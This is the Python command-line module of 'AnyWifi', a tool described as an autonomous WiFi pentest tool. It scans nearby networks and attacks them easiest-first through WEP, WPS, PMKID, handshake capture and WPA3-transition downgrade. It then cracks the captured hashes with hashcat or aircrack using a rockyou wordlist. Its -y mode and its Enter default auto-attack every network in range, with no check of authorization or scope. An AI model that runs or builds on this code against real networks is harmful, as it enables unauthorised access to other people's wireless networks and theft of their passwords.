"""AnyWifi CLI — argument parsing and autonomous/manual orchestration."""

from __future__ import annotations

import argparse
import atexit
import signal
import sys
from pathlib import Path
from typing import Optional

from anywifi import __version__
from anywifi.attacks import chain_for
from anywifi.config import DEFAULT_SCAN_TIME, LOOT_DIR
from anywifi.core import deps, platform
from anywifi.core.interface import InterfaceManager, iw_interfaces
from anywifi.core.runner import Runner
from anywifi.crack import cracker
from anywifi.model import AttackContext, AttackResult, Network
from anywifi.report.reporter import Reporter
from anywifi.scan.scanner import Scanner
from anywifi.target import selector

_EPILOG = """\
examples:
  sudo anywifi                     scan, then let you pick a target (Enter = auto)
  sudo anywifi -y                  fully hands-off: auto-attack all, no questions
  sudo anywifi --target <BSSID>    attack one specific network
  sudo anywifi --only pmkid,handshake -w rockyou.txt
  anywifi --dry-run                print the commands without running them

Just run `sudo anywifi`. After the scan it asks which network(s) to attack —
press Enter to auto-attack the easiest first. The interface, dependencies and
wordlist are found automatically. Requires Linux (Kali) + a monitor-mode adapter.
"""


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="anywifi",
        description="Autonomous WiFi pentest tool — scans nearby networks and "
                    "attacks the easiest one first (easy → hard).",
        epilog=_EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--auto", action="store_true", help="autonomous mode (this is the default)")
    p.add_argument("-i", "--interface", help="wireless interface (auto-detected if omitted)")
    p.add_argument("-w", "--wordlist", help="wordlist path (default: auto-find rockyou)")
    p.add_argument("--scan-time", type=int, default=DEFAULT_SCAN_TIME,
                   help=f"scan duration in seconds (default: {DEFAULT_SCAN_TIME})")
    p.add_argument("--target", help="attack only this BSSID")
    p.add_argument("--interactive", action="store_true",
                   help="choose targets from the scan table (this is the default; use -y to skip)")
    p.add_argument("--only", help="run only these vectors (comma-separated): "
                                  "wep,wps-pixie,pmkid,handshake,wps-pin")
    p.add_argument("--install-deps", action="store_true", help="install missing tools and exit")
    p.add_argument("--output", default=LOOT_DIR, help=f"output/loot directory (default: {LOOT_DIR})")
    p.add_argument("--stop-on-first", action="store_true", help="stop after the first cracked network")
    p.add_argument("-y", "--yes", action="store_true", help="assume yes; never prompt (hands-off)")
    p.add_argument("--no-color", action="store_true", help="disable colored output")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="show the raw tool commands being run (default: clean phase view)")
    p.add_argument("--dry-run", action="store_true", help="print commands without running them")
    p.add_argument("--version", action="version", version=f"AnyWifi {__version__}")
    return p


class Engine:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        # Live spinners/timers only make sense in the clean view; --verbose and
        # --dry-run interleave raw command lines, so fall back to static output.
        live = not (args.verbose or args.dry_run)
        self.reporter = Reporter(no_color=args.no_color, live=live)
        self.runner = Runner(dry_run=args.dry_run, verbose=args.verbose,
                             log=self.reporter.log)
        self.sys = platform.detect()
        self.iface_mgr = InterfaceManager(self.runner)
        self.output_dir = Path(args.output)
        self.only = set(x.strip() for x in args.only.split(",")) if args.only else None
        self._wordlist_resolved = False
        self._wordlist: Optional[str] = None
        self.results: list[AttackResult] = []

    # --- small helpers ---
    def _confirm(self, question: str, default_yes: bool = True) -> bool:
        if self.args.yes or self.args.dry_run:
            return True
        suffix = "[Y/n]" if default_yes else "[y/N]"
        try:
            ans = input(f"{question} {suffix} ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return False
        if not ans:
            return default_yes
        return ans in ("y", "yes")

    def wordlist(self) -> Optional[str]:
        """Resolve the wordlist lazily — only when a hash is actually captured."""
        if not self._wordlist_resolved:
            self._wordlist = cracker.find_wordlist(
                override=self.args.wordlist,
                prompt=not (self.args.dry_run or self.args.yes),
            )
            self._wordlist_resolved = True
            if self._wordlist:
                self.reporter.log(f"[*] Wordlist: {self._wordlist}", "dim")
        return self._wordlist

    def cleanup(self) -> None:
        try:
            self.iface_mgr.cleanup()
        except Exception:
            pass

    # --- entry point ---
    def run(self) -> int:
        self.reporter.banner()

        # AnyWifi only runs on Linux.
        if not self.sys.is_linux:
            self.reporter.log(
                f"[!] AnyWifi only runs on Linux (Kali recommended). "
                f"Detected system: {self.sys.os_name}.", "red")
            return 2

        if self.args.install_deps:
            return self._do_install()

        if not self.args.dry_run and not self.sys.is_root:
            self.reporter.log(
                "[!] Root required. Run it like this:  sudo anywifi", "red")
            return 2

        if self.sys.is_wsl:
            self.reporter.log(
                "[!] WSL detected. WSL2 cannot see the physical WiFi card (virtual NIC) — "
                "monitor mode / injection will NOT work.\n"
                "    Use native Kali (or a USB adapter passthrough + custom kernel). "
                "WSL is only useful as a cracking station.", "yellow")

        # Ease of use: make sure the required tools are present before we start.
        self._ensure_deps()
        return self._run_full()

    # --- dependency handling ---
    def _do_install(self) -> int:
        report = deps.check(self.runner)
        if not report.missing_core:
            self.reporter.log("[+] All core tools are already installed.", "green")
            return 0
        if not report.manager:
            self.reporter.log("[!] No supported package manager found. Install manually: "
                              + ", ".join(report.missing_core), "red")
            return 1
        if not self.sys.is_root and not self.args.dry_run:
            self.reporter.log("[!] Root required to install: sudo anywifi --install-deps", "red")
            return 2
        self.reporter.log(f"[*] Missing: {', '.join(report.missing_core)} "
                          f"→ installing with {report.manager}...", "cyan")
        ok = deps.install(self.runner, report.missing_core, report.manager)
        self.reporter.log("[+] Installation complete." if ok else "[!] Installation failed.",
                          "green" if ok else "red")
        return 0 if ok else 1

    def _ensure_deps(self) -> None:
        """Check core tools and offer to install any that are missing."""
        report = deps.check(self.runner)
        if not report.missing_core:
            return
        self.reporter.log(f"[!] Missing tools: {', '.join(report.missing_core)}", "yellow")
        if not report.manager:
            self.reporter.log("[!] No supported package manager found; install them manually.", "red")
            return
        if self._confirm(f"Install them now with {report.manager}?"):
            ok = deps.install(self.runner, report.missing_core, report.manager)
            self.reporter.log("[+] Installation complete." if ok else "[!] Installation failed.",
                              "green" if ok else "red")

    # --- full attack flow ---
    def _run_full(self) -> int:
        signal.signal(signal.SIGINT, self._on_signal)
        atexit.register(self.cleanup)

        iface = self.args.interface or self._pick_interface()
        if not iface:
            msg = "[!] No wireless interface found. Specify one with -i."
            if self.sys.is_wsl:
                msg += " (WSL cannot see the built-in WiFi card; see the note above.)"
            self.reporter.log(msg, "red")
            return 1
        if not self.args.interface:
            self.reporter.log(f"[*] Using interface: {iface}", "cyan")

        self.reporter.log(f"[*] Enabling monitor mode on {iface}...", "cyan")
        mon = self.iface_mgr.enable_monitor(iface)
        if not mon:
            self.reporter.log("[!] Could not enable monitor mode.", "red")
            return 1
        self.reporter.log(f"[+] Monitor interface: {mon}", "green")

        scanner = Scanner(self.runner)
        self.reporter.log(f"[*] Scanning nearby networks (~{self.args.scan_time}s)...", "cyan")
        with self.reporter.activity("Scanning for networks"):
            networks = scanner.scan_linux(mon, self.args.scan_time)
        if not networks:
            self.reporter.log("[!] No networks found.", "red")
            return 1
        self.reporter.scan_table(networks)

        targets = self._select_targets(networks)
        if not targets:
            self.reporter.log("[!] No suitable targets.", "yellow")
            return 0

        ctx = AttackContext(
            interface=mon, output_dir=self.output_dir, runner=self.runner,
            wordlist=None, dry_run=self.args.dry_run, only=self.only,
        )
        self.output_dir.mkdir(parents=True, exist_ok=True)

        self.reporter.rule("Attack")
        for net in targets:
            self._attack_network(net, ctx)
            if self.args.stop_on_first and any(r.cracked for r in self.results):
                break

        self.reporter.summary(self.results)
        path = self.reporter.save_json(self.results, self.output_dir)
        if path:
            self.reporter.log(f"[*] Report: {path}", "dim")
        return 0

    def _select_targets(self, networks: list[Network]) -> list[Network]:
        if self.args.target:
            wanted = self.args.target.upper()
            match = [n for n in networks if n.bssid.upper() == wanted]
            if not match:
                self.reporter.log(f"[!] Target not found: {self.args.target}", "red")
            return match
        # `displayed` matches the table order exactly (same sort) so the numbers
        # the user types line up with the rows they see.
        displayed = sorted(networks, key=selector.attack_score, reverse=True)
        auto_list = selector.rank(networks, include_open=True)
        # -y (hands-off) or a non-interactive terminal → auto-attack all.
        if self.args.yes or not sys.stdin.isatty():
            return auto_list
        return self._interactive_pick(displayed, auto_list)

    def _interactive_pick(self, displayed: list[Network],
                          auto_list: list[Network]) -> list[Network]:
        self.reporter.log(
            "Pick target(s): number(s) like 1 or 1,3  |  "
            "Enter = auto-attack all (easiest first)  |  q = quit", "cyan")
        try:
            raw = input("> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return []
        if raw in ("q", "quit", "exit"):
            return []
        if not raw:
            return auto_list
        idxs = []
        for tok in raw.split(","):
            tok = tok.strip()
            if tok.isdigit() and 1 <= int(tok) <= len(displayed):
                idxs.append(int(tok) - 1)
        if not idxs:
            self.reporter.log("[!] No valid selection — auto-attacking all.", "yellow")
            return auto_list
        return [displayed[i] for i in idxs]

    def _attack_network(self, net: Network, ctx: AttackContext) -> None:
        self.reporter.target_header(net)

        if net.is_open:
            res = AttackResult(network=net, vector="open", success=True,
                               message="Open network — no password required")
            self.reporter.result(res)
            self.results.append(res)
            return

        if net.channel <= 0:
            self.reporter.log(f"  [-] Skipping (unknown channel): {net.label()}", "yellow")
            return

        if net.is_transition:
            self.reporter.log(
                "  [i] WPA3-Transition (mixed) network → downgrading to the WPA2 side "
                "(PMKID/handshake)", "cyan")

        chain = chain_for(net)
        if not chain:
            self.reporter.log(f"  [-] No applicable vector: {net.label()}", "yellow")
            return

        for attack in chain:
            if not ctx.wants(attack.vector):
                continue
            with self.reporter.activity(attack.label) as act:
                ctx.on_status = act.detail
                try:
                    res = attack.run(net, ctx)
                except KeyboardInterrupt:
                    raise
                except Exception as exc:  # keep going even if one vector blows up
                    res = AttackResult(network=net, vector=attack.vector,
                                       success=False, message=f"error: {exc}")
                finally:
                    ctx.on_status = None

            # Captured but not cracked yet → try cracking
            if res.success and res.password is None and (res.hash_file or res.capture_file):
                self._crack(res)

            self.reporter.result(res)
            self.results.append(res)
            if res.cracked:
                return  # this network is done

    def _crack(self, res: AttackResult) -> None:
        wl = self.wordlist()
        if not wl:
            res.message += " (no wordlist — cracking skipped)"
            return
        name = Path(wl).name
        have_hashcat = self.runner.dry_run or self.runner.has("hashcat")
        with self.reporter.activity(f"Cracking with {name}") as act:
            def on_prog(tried: int, total: int, speed: str) -> None:
                act.detail(self.reporter.fmt_progress(tried, total, speed))

            pw = None
            # Prefer hashcat (22000). Only fall back to aircrack when hashcat
            # can't be used — running both over the same wordlist is redundant
            # and doubles the wait for nothing.
            if res.hash_file and have_hashcat:
                pw = cracker.crack_22000(self.runner, res.hash_file, wl, on_progress=on_prog)
            elif res.capture_file and res.capture_file.endswith(".cap"):
                pw = cracker.crack_handshake_aircrack(
                    self.runner, res.capture_file, res.network.bssid, wl, on_progress=on_prog)
        if pw:
            res.password = pw
            res.success = True
            res.message = "Password cracked"

    def _pick_interface(self) -> Optional[str]:
        # Prefer a normal (managed) interface over a leftover monitor one.
        pairs = iw_interfaces(self.runner)
        managed = [name for name, typ in pairs if typ != "monitor"]
        if managed:
            return managed[0]
        names = [name for name, _ in pairs]
        return names[0] if names else None

    def _on_signal(self, signum, frame):
        self.reporter.log("\n[!] Interrupted — cleaning up...", "yellow")
        self.cleanup()
        sys.exit(130)


def main(argv: Optional[list[str]] = None) -> int:
    args = build_parser().parse_args(argv)
    engine = Engine(args)
    try:
        return engine.run()
    except KeyboardInterrupt:
        engine.cleanup()
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
